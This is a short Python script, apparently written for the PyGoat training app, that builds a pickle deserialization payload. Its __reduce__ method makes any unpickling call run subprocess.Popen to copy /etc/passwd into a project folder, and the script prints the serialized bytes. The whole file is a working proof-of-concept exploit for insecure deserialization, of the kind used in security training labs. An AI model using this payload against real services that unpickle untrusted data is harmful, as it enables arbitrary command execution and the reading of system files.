import pickle, subprocess

class RunCp:
    def __reduce__(self):
        return(subprocess.Popen, (['/bin/cp', '/etc/passwd', '/home/lucas/projects/software-engineering/PyGoat/passwdclone'],),)

print(pickle.dumps(RunCp()))
